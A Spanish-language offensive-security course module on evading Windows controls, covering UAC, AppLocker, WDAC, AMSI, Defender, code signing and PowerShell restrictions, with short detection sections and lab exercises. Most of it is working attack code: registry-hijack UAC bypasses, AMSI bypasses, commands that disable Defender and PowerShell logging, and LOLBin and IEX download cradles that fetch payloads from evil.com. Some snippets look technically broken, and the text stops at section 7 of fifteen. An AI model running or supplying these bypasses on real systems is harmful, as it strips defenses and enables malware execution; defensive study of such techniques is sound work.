# Evasion de Controles Locales en Windows

---

## Indice

> ⏱️ **Tiempo estimado:** 15 horas (~3 sesiones) (2171 lineas)


1. [UAC Bypass](#1-uac-bypass)
2. [AppLocker Evasion](#2-applocker-evasion)
3. [WDAC (Windows Defender Application Control)](#3-wdac-windows-defender-application-control)
4. [AMSI Bypass](#4-amsi-bypass)
5. [Windows Defender Evasion](#5-windows-defender-evasion)
6. [Code Signing Evasion](#6-code-signing-evasion)
7. [PowerShell Restrictions Bypass](#7-powershell-restrictions-bypass)
8. [LOLBins (Living Off The Land Binaries)](#8-lolbins-living-off-the-land-binaries)
9. [Process Injection](#9-process-injection)
10. [ETW Evasion](#10-etw-evasion)
11. [Driver Signing Bypass](#11-driver-signing-bypass)
12. [Token Manipulation](#12-token-manipulation)
13. [Defensa y Deteccion](#13-defensa-y-deteccion)
14. [Ejercicios Practicos](#14-ejercicios-practicos)
15. [Apéndice: Cheatsheet](#15-apendice-cheatsheet)

---

## 1. [uac bypass](../raw/w1n-byp4ss3s.md#uac-bypass)

### 1.1 Fundamentos de UAC

UAC (User Account Control) es un mecanismo de seguridad de Windows que separa los privilegios de administrador del usuario normal. Cuando un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) necesita privilegios elevados, UAC muestra un prompt de confirmacion.

**Niveles de UAC:**
```
Siempre notificar (mas seguro) - Prompt en escritorio seguro
Notificar solo cuando las apps intentan cambios (default)
Notificar solo cuando las apps intentan cambios (sin escritorio seguro)
No notificar (mas debil) - Sin prompt
```

**Token Elevation:**
Cuando un administrador loguea, Windows crea dos tokens:
- **Filtered Token**: Sin privilegios admin (explorer.exe corre con este)
- **Full Token**: Con todos los privilegios admin

UAC bypass consiste en ejecutar codigo con el Full Token sin que aparezca el prompt.

### 1.2 Fodhelper Bypass

```powershell
# Tecnica clasica usando fodhelper.exe
# fodhelper.exe es un binario firmado por Microsoft que se ejecuta elevado

# 1. Modificar registro para que fodhelper ejecute nuestro comando
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "(default)" -Value "cmd.exe /c whoami > C:\uac_bypass.txt"

# 2. Ejecutar fodhelper (se ejecuta elevado)
fodhelper.exe

# 3. Limpiar
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

# Variante con PowerShell en memoria:
$cmd = "powershell -windowstyle hidden -Command `"Start-Process cmd -Verb RunAs`""
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "(default)" -Value $cmd -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "DelegateExecute" -Value "" -Force
fodhelper.exe
```

### 1.3 EventVwr Bypass

```powershell
# eventvwr.exe es otro binario firmado que se ejecuta elevado
# Similar a fodhelper pero usa otra clave de registro

# 1. Registrar comando en registry
New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" `
    -Name "(default)" -Value "cmd.exe /c powershell -ep bypass -f payload.ps1"

# 2. Ejecutar eventvwr (elevado)
eventvwr.exe

# 3. Limpiar
Remove-Item -Path "HKCU:\Software\Classes\mscfile\" -Recurse -Force
```

### 1.4 SDCLT Bypass

```powershell
# sdclt.exe bypass
New-Item -Path "HKCU:\Software\Classes\exefile\shell\runas\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\runas\command" `
    -Name "(default)" -Value "cmd.exe /c start calc.exe"

sdclt.exe /id:DownloadUpgrade

# Cleanup
Remove-Item -Path "HKCU:\Software\Classes\exefile\" -Recurse -Force
```

### 1.5 ComputerDefaults Bypass

```powershell
# computerdefaults.exe bypass
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "(default)" -Value "cmd.exe"
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "DelegateExecute" -Value "" -Force

computerdefaults.exe
```

### 1.6 SilentCleanup Bypass

```powershell
# silentcleanup usa tareas programadas
# La tarea "SilentCleanup" se ejecuta como SYSTEM

# 1. Configurar variable de entorno para que apunte a nuestro payload
$env:windir = "C:\Windows\System32\cmd.exe /c whoami > C:\proof.txt & "
# Nota: el bypass funciona porque SilentCleanup corre como SYSTEM
# y usa %windir% en su path

# 2. Ejecutar la tarea
schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I

# La tarea ejecuta %windir%\system32\cleanmgr.exe
# Pero si %windir% apunta a cmd.exe, ejecuta nuestro comando
```

### 1.7 Otras Tecnicas de UAC Bypass

```powershell
# === CMSTP Bypass ===
# cmstp.exe puede instalar perfiles de conexion
# Con un .inf malicioso puede ejecutar comandos como admin

# === SLUI Bypass ===
# slui.exe es el activation wizard de Windows
# Como fodhelper, puede ser explotado via registry

# === WSReset Bypass ===
# wsreset.exe (Windows Store Reset) tambien es elevable
# Via HKCU\Software\Classes\AppX82a6gw...\Shell\open\command

# === MSConfig Bypass ===
# msconfig.exe -> diagnostic tools

# === Azure AD Join Bypass ===
# Controlador de dominio Azure AD tambien es elevable
```

### 1.8 Comparativa de Tecnicas UAC

| Tecnica | Binario | Registro | Detectabilidad | Windows Version |
|---------|---------|----------|----------------|-----------------|
| Fodhelper | fodhelper.exe | ms-settings | Media | 10/11 |
| EventVwr | eventvwr.exe | mscfile | Media | 7-11 |
| SDCLT | sdclt.exe | exefile | Alta | 10 |
| ComputerDefaults | computerdefaults.exe | ms-settings | Media | 10 |
| SilentCleanup | cleanmgr.exe | Env [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables) | Baja | 8-11 |
| CMSTP | cmstp.exe | INF file | Media | 8-11 |
| WSReset | wsreset.exe | AppX CLSID | Alta | 10/11 |

### 1.9 Deteccion de UAC Bypass

```powershell
# Que monitorear para detectar UAC bypass:

# 1. Registry changes a las claves de bypass
# EventID 4657 (Registry modification)
# Buscar: HKCU\Software\Classes\ms-settings\
# Buscar: HKCU\Software\Classes\mscfile\

# 2. Procesos elevados inesperados
# EventID 4688 con TokenElevationType = Full (3)
# Procesos como fodhelper.exe creando cmd.exe

# 3. Sysmon EventID 1 y 11
# Process creation: fodhelper.exe -> cmd.exe
# Registry modification a clases de UAC bypass

# 4. Detectar con PowerShell:
function Test-UACBypassRegistry {
    $paths = @(
        "HKCU:\Software\Classes\ms-settings\shell\open\command",
        "HKCU:\Software\Classes\mscfile\shell\open\command",
        "HKCU:\Software\Classes\exefile\shell\runas\command"
    )
    
    foreach ($path in $paths) {
        if (Test-Path $path) {
            $value = (Get-ItemProperty $path).'(default)'
            if ($value) {
                Write-Warning "Posible UAC bypass en $path -> $value"
            }
        }
    }
}
```

### 1.10 Ejercicios Practicos

**Ejercicio 1.1:** Implementa el bypass de fodhelper y documenta: que cambios de registro hace, que proceso se crea, con que privilegios.

**Ejercicio 1.2:** Configura [sysmon](../raw/3dr-3v4s10n.md#sysmon) para detectar UAC bypass. Prueba fodhelper y eventvwr, verifica que alerts se generan.

---

## 2. AppLocker Evasion

### 2.1 Que es AppLocker?

AppLocker es una politica de control de aplicaciones que permite/bloquea ejecucion por:
- Publisher (firma digital)
- Path (ruta de instalacion)
- File [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions)
- File attribute (version, product name, etc.)

```bash
# AppLocker no es un antivirus - solo controla que se ejecuta
# Reglas por defecto:
# - Permitir: %ProgramFiles%, %SystemRoot%, %WinDir%
# - Bloquear: Todo lo demas

# Default rules for EXE:
# - Everyone: %ProgramFiles%\* y %SystemRoot%\*
# - BUILTIN\Administrators: todas las rutas
```

### 2.2 Bypass via DLL SideLoading

```powershell
# DLL SideLoading: Windows busca DLLs en el mismo directorio del ejecutable
# Si un ejecutable legitimo carga una DLL insegura, podemos ponerla ahi

# Ejemplo con calc.exe (no aplica pero concepto):
# 1. Crear un directorio: C:\Users\Public\calc\
# 2. Copiar calc.exe y crear WININET.dll maliciosa
# 3. Ejecutar calc.exe -> Carga WININET.dll -> Codigo ejecutado

# Mas comun: sideloading en aplicaciones con DLL hijacking:
# - WMP (wmp.dll)
# - Office (hlink.dll)
# - Teams (version.dll)
# - Chrome (chrome_elf.dll)
```

### 2.3 Bypass via LOLBins

```powershell
# AppLocker permite ejecutables en %SystemRoot% y %ProgramFiles%
# Los LOLBins estan ahi, por lo tanto estan permitidos

# Ejemplo: InstallUtil.exe (firmado, en Framework)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

# MSBuild.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe malicious.csproj

# regsvr32.exe (WebDAV inline)
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll

# mshta.exe
mshta.exe http://evil.com/payload.hta

# rundll32.exe
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('test')

# cscript/wscript
cscript //nologo C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs http://evil.com/test
```

### 2.4 Alternate [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) Hosts

```powershell
# Si AppLocker bloquea powershell.exe, usar hosts alternativos:

# PowerShell via Managed Execution:
# Unmanaged PowerShell (CreatePipeline)
using System.Management.Automation;
PowerShell ps = PowerShell.Create();
ps.AddScript("Get-Process | Export-Csv results.csv");
ps.Invoke();

# PowerShell via runspace:
$Runspace = [RunspaceFactory]::CreateRunspace()
$PowerShell = [PowerShell]::Create()
$PowerShell.Runspace = $Runspace
$PowerShell.AddScript({Get-Process})
$PowerShell.Invoke()

# C# que carga System.Management.Automation.dll
```

### 2.5 Bypass via Alternate Data Streams

```powershell
# AppLocker NO bloquea ADS (Alternate Data Streams)
# Se puede almacenar y ejecutar codigo en ADS

# Crear ADS con payload:
type payload.exe > C:\Windows\System32\calc.exe:hidden.exe

# Ejecutar ADS (requiere Win32 API, no cmd directamente):
# Usar PowerShell:
Invoke-CimMethod -ClassName Win32_Process -MethodName Create `
    -Arguments @{CommandLine = "C:\Windows\System32\calc.exe:hidden.exe"}
```

### 2.6 Bypass via File Extension Confusion

```powershell
# AppLocker puede tener reglas por extension:
# Bloquea *.exe pero permite *.ps1, *.vbs, *.js

# Convertir EXE a PS1 (base64):
$bytes = [System.IO.File]::ReadAllBytes("payload.exe")
$b64 = [System.Convert]::ToBase64String($bytes)
$b64 | Out-File payload_base64.txt

# Luego desde PowerShell ejecutar:
$bytes = [System.Convert]::FromBase64String((Get-Content payload_base64.txt -Raw))
[System.Reflection.Assembly]::Load($bytes)
[Payload.Class]::Run()

# O usar regsvr32 para ejecutar SCT:
# regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll
```

### 2.7 [applocker bypass](../raw/w1n-byp4ss3s.md#applocker-bypass) via Execution from Per-User Paths

```powershell
# Si las reglas por defecto permiten %SystemRoot%\ y %ProgramFiles%,
# pero hay paths de usuario no bloqueados:

# %LOCALAPPDATA%\Microsoft\WindowsApps\ (donde estan las apps UWP)
# Cargar dll aqui puede eludir AppLocker

# Ademas:
# %APPDATA%\Microsoft\Windows\Start Menu\Programs\ (startup)
```

### 2.8 Deteccion de AppLocker Evasion

```powershell
# EventID 8002: AppLocker blocked EXE
# EventID 8003: AppLocker blocked MSI
# EventID 8004: AppLocker blocked Script
# EventID 8005: AppLocker blocked DLL
# EventID 8006: AppLocker blocked packaged app
# EventID 8007: AppLocker blocked packaged app installer

# EventID 8000: AppLocker allowed
# EventID 8001: AppLocker allowed (appx)

# Monitorear:
# - Procesos que no deberian ejecutarse
# - DLL SideLoading events (Sysmon EventID 7)
# - Ejecucion desde paths inusuales
```

### 2.9 Ejercicios Practicos

**Ejercicio 2.1:** Configura AppLocker con reglas por defecto. Prueba bypass usando InstallUtil y MSBuild.

**Ejercicio 2.2:** Implementa DLL SideLoading para ejecutar codigo en un contexto permitido.

---

## 3. WDAC (Windows Defender Application Control)

### 3.1 Que es WDAC?

WDAC es el reemplazo de AppLocker en Windows 10/11 Enterprise. Es mas restrictivo:
- Basado en configuracion de politica (XML)
- Se aplica a nivel [kernel](../raw/0s-f0nd4m3nt0s.md#kernel)
- No se puede desactivar desde user mode
- Soporta firmas de Hyper-V, CI (Code Integrity)

```bash
# WDAC vs AppLocker:
# WDAC: Kernel-mode policy, pre-boot, no GUI, mas seguro
# AppLocker: User-mode, GPO, GUI, menos seguro

# Politicas WDAC:
# - Base policy: Reglas base
# - Supplemental policy: Complemento (para actualizaciones)
# - Default: Solo permite Windows y 3rd party signed
```

### 3.2 WDAC Tampering

```bash
# WDAC se puede desactivar (requiere admin y reboot):
# 1. Deshabilitar en Secure Boot
# 2. Cambiar modo de auditoria
# 3. Polticas sueltas

# Comandos:
# Listar politicas:
Get-CIPolicy

# Deshabilitar temporalmente:
# HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy
# Disabled = 1

# Si WDAC esta en modo enforcement:
# - Solo permite ejecutables firmados (WHQL o Microsoft)
# - Sin firmas -> no se ejecutan
```

### 3.3 WDAC Evasion

```bash
# Metodos de evasion cuando WDAC esta activo:
# 1. Si el ejecutable esta firmado por Microsoft -> permitido
# 2. Si el ejecutable esta en paths de confianza (si configurado)
# 3. Ejecucion via macros de Office (VBA) con firmas validas
# 4. PowerShell en modo constrained language

# Constrained Language Mode en PowerShell:
# Cuando WDAC esta activo, PS corre en CLM
# No permite: Add-Type, New-Object -COM, CreateInstance, etc.
# Pero permite: cmdlets, .NET types permitidos

# Bypass de CLM:
# - Usar types nativos de .NET (System.IO, System.Diagnostics)
# - Reflection con types existentes
# - Invoke-Expression con codigo limitado
```

### 3.4 Ejercicios Practicos

**Ejercicio 3.1:** Habilita WDAC en modo auditoria en un sistema de pruebas. Identifica que aplicaciones bloquearia en modo enforcement.

**Ejercicio 3.2:** Prueba ejecutar diferentes tipos de payloads con WDAC activo y documenta cuales pasan.

---

## 4. [amsi bypass](../raw/3dr-3v4s10n.md#amsi-bypass)

### 4.1 Que es [amsi](../raw/3dr-3v4s10n.md#amsi)?

AMSI (Anti-Malware Scan Interface) es una interfaz que permite a aplicaciones ([powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell), VBScript, JScript, VBA, .NET) enviar contenido a un antivirus para escaneo antes de ejecutarlo.

```bash
# AMSI Providers registered:
# HKLM\Software\Microsoft\AMSI\Providers
# Cada provider (Windows Defender, etc.) recibe contenido

# AMSI se integra en:
# - PowerShell (System.Management.Automation.dll)
# - Windows Script Host (wscript/cscript)
# - VBA (Office macros)
# - .NET (System.Reflection.Assembly.Load)
# - JScript/VBScript
```

### 4.2 [amsi bypass](../raw/3dr-3v4s10n.md#amsi-bypass) via Registry

```powershell
# Deshabilitar AMSI via registry (funciona en algunas configs):
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows Script\Settings" `
    -Name "AmsiEnable" -Value 0 -Type DWord -Force

# O via HKCU (sin admin):
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows Script\Settings" `
    -Name "AmsiEnable" -Value 0 -Type DWord -Force

# Nota: Windows Defender ya no respeta este registry key en Win10 1903+
```

### 4.3 AMSI Bypass via Patching AmsiScanBuffer

```powershell
# AmsiScanBuffer es la funcion clave en amsi.dll
# Parchearla para que siempre retorne AMSI_RESULT_CLEAN

# Tecnica base:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    .GetField('amsiInitFailed','NonPublic,Static')
    .SetValue($null,$true)

# Explicacion:
# AmsiUtils tiene un campo amsiInitFailed
# Si se setea a true, AMSI nunca se inicializa
# Todas las llamadas retornan AMSI_RESULT_CLEAN

# Variante:
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$field = $amsi.GetField('amsiInitFailed','NonPublic,Static')
$field.SetValue($null,$true)
```

### 4.4 AMSI Bypass via Memory Patching

```powershell
# Parche directo en memoria de amsi!AmsiScanBuffer
# Buscar el byte pattern de la funcion y cambiarlo

# Version base:
function Bypass-AMSI {
    $data = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Get-ProcAddress amsi.dll AmsiScanBuffer),
        [Func[IntPtr,IntPtr,IntPtr,UInt64,UInt64]]
    )
    
    # Patron a modificar para retornar 0 (AMSI_RESULT_CLEAN)
    # Esto varia segun version de Windows
    $patch = [Byte[]]@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # mov eax,80070057h; ret
    
    [System.Runtime.InteropServices.Marshal]::Copy(
        $patch, 0, 
        [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($data),
        6
    )
}

# Mas simple (si no funciona el patch):
# Usar reflection para deshabilitar la scan
```

### 4.5 AMSI Bypass via DLL Reflection

```powershell
# Cargar amsi.dll modificada o forzar que no se cargue:
# 1. Renombrar amsi.dll en System32 (requiere admin)
# 2. Crear un amsi.dll falso en el directorio de la app

# O forzar error de carga:
[System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')
$type = [System.Management.Automation.PSObject].Assembly.GetType(
    'System.Management.Automation.AmsiUtils'
)
$type.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Forzar excepcion:
function Force-AmsiInitFail {
    $a=[Ref].Assembly.GetTypes()
    ForEach($b in $a) {
        if ($b.Name -like "*Amsi*") {
            $b.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
        }
    }
}
```

### 4.6 AMSI Bypass via Hardware Breakpoints

```powershell
# Usar hardware breakpoints para interceptar AmsiScanBuffer:
# 1. Setear hardware breakpoint en AmsiScanBuffer
# 2. En el handler, modificar el resultado a AMSI_RESULT_CLEAN
# 3. Continuar ejecucion

# Mas complejo pero evita parches en memoria
# Requiere Vectored Exception Handler (VEH)

# Ejemplo conceptual:
$veh = [System.Runtime.InteropServices.NativeAPI]::AddVectoredExceptionHandler(1, {
    param($ExceptionInfo)
    if ($ExceptionInfo.ExceptionRecord.ExceptionCode -eq 0x80000003) {  # EXCEPTION_BREAKPOINT
        # Check if it's AmsiScanBuffer
        # Modify context to return AMSI_RESULT_CLEAN
        return 0  # EXCEPTION_CONTINUE_EXECUTION
    }
    return 1  # EXCEPTION_CONTINUE_SEARCH
})
```

### 4.7 Script de Bypass AMSI (Todo-en-Uno)

```powershell
# AMSI Bypass universal (multiple tecnicas):
function Invoke-AMSIByPass {
    # Metodo 1: amsiInitFailed
    try {
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
            .GetField('amsiInitFailed','NonPublic,Static')
            .SetValue($null,$true)
        Write-Host "[+] Metodo 1: amsiInitFailed = OK"
    } catch { Write-Host "[-] Metodo 1 fallo" }
    
    # Metodo 2: AmsiUtils field scan
    try {
        $types = [Ref].Assembly.GetTypes()
        foreach ($t in $types) {
            if ($t.Name -like "*Amsi*" -or $t.Name -like "*amsi*") {
                $fields = $t.GetFields('NonPublic,Static')
                foreach ($f in $fields) {
                    if ($f.Name -like "*init*" -or $f.Name -like "*fail*") {
                        $f.SetValue($null,$true)
                        Write-Host "[+] Metodo 2: $($t.Name).$($f.Name) = OK"
                    }
                }
            }
        }
    } catch { Write-Host "[-] Metodo 2 fallo" }
}

Invoke-AMSIByPass
# Ahora AMSI esta deshabilitado en esta sesion
```

### 4.8 Deteccion de AMSI Bypass

```powershell
# Como detectar AMSI bypass:

# 1. EventID 4104 (PowerShell ScriptBlock Logging)
#    - Buscar "amsiInitFailed" en el script
#    - Buscar "AmsiUtils" en el script
#    - Buscar "AmsiScanBuffer"

# 2. Sysmon EventID 10 (ProcessAccess) a lsass.exe
#    - Muchas herramientas de AMSI bypass tambien inyectan

# 3. ETW events de PowerShell
#    - Provider: Microsoft-Windows-PowerShell
#    - Buscar operaciones de reflection en types especificos

# 4. AMSI Provider logging
#    - Windows Defender registra scans fallidos

# 5. Detectar parches en amsi.dll
#    - Comparar amsi.dll en disco vs en memoria
#    - Volatility: apihooks
```

### 4.9 Ejercicios Practicos

**Ejercicio 4.1:** Implementa un bypass de AMSI usando amsiInitFailed. Verifica que funciona ejecutando `Invoke-Mimikatz` (simulado) sin ser bloqueado.

**Ejercicio 4.2:** Configura monitoreo para detectar AMSI bypass. Prueba diferentes tecnicas y documenta cual genera mas alertas.

---

## 5. Windows Defender Evasion

### 5.1 Arquitectura de Defender

```bash
# Windows Defender (MsMpEng.exe) tiene varios componentes:
# - Real-time protection (monitoreo constante)
# - Cloud-delivered protection (MAPS)
# - Behavior monitoring
# - Network protection
# - Tamper protection

# Servicios:
# WinDefend - Servicio principal
# WdNisSvc - Network Inspection Service
# Sense - Windows Defender ATP

# Dlls importantes:
# mpclient.dll - Interfaz cliente
# mpengine.dll - Motor de analisis
# mpsvc.dll - Servicio
```

### 5.2 Exclusiones

```powershell
# Agregar exclusiones (requiere admin):
Add-MpPreference -ExclusionPath "C:\Users\Public\malware"
Add-MpPreference -ExclusionExtension ".exe"
Add-MpPreference -ExclusionProcess "cmd.exe"

# Via CLI:
MpCmdRun.exe -AddExclusion -ExclusionPath C:\malware
MpCmdRun.exe -AddExclusion -ExclusionExtension .exe
MpCmdRun.exe -AddExclusion -ExclusionProcess notepad.exe

# Ver exclusiones:
Get-MpPreference | Select-Object ExclusionPath, ExclusionExtension, ExclusionProcess
```

### 5.3 Deshabilitar Defender

```powershell
# Metodo 1: Deshabilitar servicio (requiere admin + tamper protection off)
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableIntrusionPreventionSystem $true

# Metodo 2: Via PowerShell con prioridad alta
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true"

# Metodo 3: Registry (si tamper protection esta off)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" `
    -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force

# Metodo 4: Detener servicio
sc stop WinDefend
sc config WinDefend start= disabled
```

### 5.4 Template-Based AV Evasion

```powershell
# Las firmas de Defender se basan en patrones
# Cambiar el template del ejecutable puede evadirlo

# Tecnicas de evasion de firmas:

# 1. XOR encoding:
function XOR-Encrypt($data, $key) {
    $result = @()
    for ($i = 0; $i -lt $data.Length; $i++) {
        $result += $data[$i] -bxor $key[$i % $key.Length]
    }
    return $result
}

# 2. AES encryption:
function AES-Encrypt($data, $key, $iv) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv
    $encryptor = $aes.CreateEncryptor()
    return $encryptor.TransformFinalBlock($data, 0, $data.Length)
}

# 3. Base64 + GZip:
$compressed = [System.IO.Compression.GZipStream]::Compress($data)
$b64 = [System.Convert]::ToBase64String($compressed)
```

### 5.5 Argument Obfuscation

```powershell
# Defender detecta comandos comunes
# Ofuscacion de argumentos:

# En lugar de:
Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"

# Usar:
$c1 = "privilege::debug"
$c2 = "sekurlsa::logonpasswords"
$cmd = "$c1 $c2"
Start-Process -FilePath "mimikatz.exe" -ArgumentList $cmd

# O usar:
$args = @()
$args += "privilege"
$args += "::"
$args += "debug"
$args += " "
$args += "sekurlsa"
$args += "::"
$args += "logonpasswords"
Start-Process -FilePath "mimikatz.exe" -ArgumentList ($args -join "")
```

### 5.6 Packing y Obfuscation

```powershell
# Herramientas de packing:
# - UPX (Ultimate Packer for eXecutables)
# - ConfuserEx (.NET obfuscator)
# - SmartAssembly
# - Obfuscar

# Para .NET:
# ConfuserEx ofusca metodos, strings, recursos
# Dificulta la deteccion por firmas estaticas

# Para native EXE:
# UPX comprime y empaqueta
# Pero es bien conocido y detectado
# Mejor: custom packer o encryptor
```

### 5.7 Process Hollowing vs Defender

```powershell
# Process hollowing es detectado por behavior monitoring
# Para evadir: usar tecnicas mas silenciosas

# Evitar CreateRemoteThread (Sysmon EventID 8 detecta):
# - Usar APC injection
# - Usar Process Doppelganging
# - Usar atom bombing

# Evitar WriteProcessMemory a procesos remotos:
# - Usar QueueUserAPC
# - Usar SetThreadContext (hollowing mode)
# - Evitar cambios en memoria de procesos protegidos
```

### 5.8 Ejercicios Practicos

**Ejercicio 5.1:** Crea un [payload](../raw/m3t4spl01t.md#payloads) que evade Defender usando XOR encoding + reflective loading. Prueba en un sistema con Defender activo.

**Ejercicio 5.2:** Configura reglas de deteccion en [sysmon](../raw/3dr-3v4s10n.md#sysmon) para identificar las tecnicas de packing/obfuscation.

---

## 6. Code Signing Evasion

### 6.1 Code Signing en Windows

```bash
# Windows verifica firmas en:
# - Driver loading (WHQL signature required)
# - Secure Boot (firmware signature)
# - SmartScreen (Mark of the Web)
# - PowerShell execution policy
# - WDAC/AppLocker publisher rules

# Tipos de firmas:
# - Authenticode: Para ejecutables, DLLs, MSI
# - WHQL: Para drivers (Windows Hardware Quality Labs)
# - EV Code Signing: Extended Validation (hardware token)
# - Windows Store: Para UWP apps
```

### 6.2 Firma de Ejecutable

```powershell
# Firmar un binario con certificado propio:
# 1. Crear certificado
New-SelfSignedCertificate -Type Codesigning -Subject "CN=EvilCorp" `
    -CertStoreLocation Cert:\CurrentUser\My

# 2. Exportar a PFX
$password = ConvertTo-SecureString "password" -AsPlainText -Force
Export-PfxCertificate -Cert Cert:\CurrentUser\My\<THUMBPRINT> `
    -FilePath cert.pfx -Password $password

# 3. Firmar el binario
signtool.exe sign /fd SHA256 /a /f cert.pfx /p password payload.exe
```

### 6.3 Stealing Signatures

```powershell
# Robar firmas de binarios existentes:

# 1. Encontrar binarios vulnerables a sideload
# - Tienen firma valida
# - Cargan DLLs inseguras
# - No verifican integridad de la DLL

# 2. Usar firmas de binarios de Microsoft
# - PowerShell.exe esta firmado
# - InstallUtil.exe esta firmado
# - Todos los LOLBins estan firmados

# 3. Si se encuentra una vulnerabilidad de PE:
# - Modificar secciones validas manteniendo la firma
# - Muy dificil en la practica
```

### 6.4 Timestamp Evasion

```powershell
# Los timestamps de firma son verificados por Windows
# Si el timestamp expiro, la firma se considera invalida

# Evadir verificacion de timestamp:
# - No poner timestamp (signtool sin /t)
# - Usar timestamp server propio
# - Fijar clock del sistema a fecha valida

# Comandos:
signtool.exe sign /fd SHA256 /a /f cert.pfx /p password `
    /tr http://timestamp.digicert.com /td SHA256 payload.exe
```

### 6.5 Ejercicios Practicos

**Ejercicio 6.1:** Crea un certificado de code signing auto-firmado y firma un ejecutable. Verifica la firma con `signtool verify`.

**Ejercicio 6.2:** Analiza ejecutables firmados en el sistema. Identifica que certificados tienen y quien los emitio.

---

## 7. [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) Restrictions Bypass

### 7.1 PowerShell Execution Policy

```powershell
# Execution Policy NO es un control de seguridad
# Es una convencion que puede ser evadida facilmente

# Ver politica actual:
Get-ExecutionPolicy

# Polticas disponibles:
# Restricted - No ejecuta scripts (solo comandos interactivos)
# AllSigned - Solo scripts firmados
# RemoteSigned - Scripts locales OK, remotos firmados
# Unrestricted - Todos los scripts
# Bypass - Sin restriccion

# Bypass de execution policy:
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -File script.ps1
powershell -c "Get-Process"  # Comando directo siempre funciona
powershell -EncodedCommand <BASE64>  # Ejecutar encoded
```

### 7.2 PowerSploit y Reflection

```powershell
# PowerSploit: Framework de PowerShell ofensivo
# Carga remota sin escribir a disco:

# Cargar desde URL:
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/PowerSploit.ps1')

# Cargar desde memoria (byte array):
$bytes = (New-Object Net.WebClient).DownloadData('http://evil.com/PowerUp.ps1')
$assembly = [System.Reflection.Assembly]::Load($bytes)
[PowerUp]::Invoke-AllChecks()

# Cargar desde base64:
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes('payload.ps1'))
# Luego en maquina victima:
$bytes = [Convert]::FromBase64String($b64)
IEX ([System.Text.Encoding]::UTF8.GetString($bytes))
```

### 7.3 Constrained Language Mode (CLM)

```powershell
# CLM es activado por WDAC o por politica
# Restringe PowerShell a un subconjunto de cmdlets

# Verificar si estamos en CLM:
$ExecutionContext.SessionState.LanguageMode

# Resultado posibles:
# FullLanguage - Sin restricciones (normal)
# ConstrainedLanguage - Restringido (solo cmdlets permitidos)
# RestrictedLanguage - Muy restringido

# Bypass de CLM:
# 1. Usar tipos .NET permitidos:
[System.IO.File]::ReadAllText('C:\payload.ps1')

# 2. Crear Runspace personalizado:
$rs = [RunspaceFactory]::CreateRunspace()
$rs.Open()
$ps = [PowerShell]::Create()
$ps.Runspace = $rs
$ps.AddCommand('Get-Process').Invoke()
$rs.Close()
```

### 7.4 PowerShell Logging Evasion

```powershell
# PowerShell tiene varios tipos de logging:
# - ScriptBlock Logging (EventID 4104)
# - Module Logging (EventID 4103)
# - Transcription
# - Protected Event Logging

# Evasion:
# 1. Deshabilitar logging (requiere admin):
$settings = @{
    EnableScriptBlockLogging = $false
    EnableTranscripting = $false
}
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
    -Name "EnableScriptBlockLogging" -Value 0 -Force

# 2. Inline evasion (script sin logging parcial):
# $script = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))
# IEX $script

# 3. PowerShell downgrade attack:
# Windows 7 tiene menos logging
# powershell -version 2 (sin logging de bloque)
```

### 7.5 Ejercicios Practicos

